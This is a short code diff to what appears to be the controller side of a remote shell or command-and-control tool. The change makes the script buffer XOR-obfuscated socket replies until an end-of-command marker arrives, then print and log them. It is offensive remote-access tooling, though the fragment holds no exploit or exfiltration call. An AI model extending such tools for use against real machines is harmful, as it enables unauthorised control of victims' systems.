@@ -60,10 +60,18 @@ def main():
                 print(f"[+] File saved to {path}")
                 log_session(log_file, f"[+] File saved: {path}")
             else:
-                response = xor_encrypt(client_socket.recv(BUFFER_SIZE))
-                decoded = response.decode(errors="ignore")
+                buffer = b""
+                while True:
+                    chunk = xor_encrypt(client_socket.recv(BUFFER_SIZE))
+                    if b"<<END_OF_CMD>>" in chunk:
+                        buffer += chunk.replace(b"<<END_OF_CMD>>", b"")
+                        break
+                    buffer += chunk
+
+                decoded = buffer.decode(errors="ignore")
                 print(decoded)
                 log_session(log_file, decoded)
+
         except Exception as e:
             print(f"[!] Error: {e}")
             break
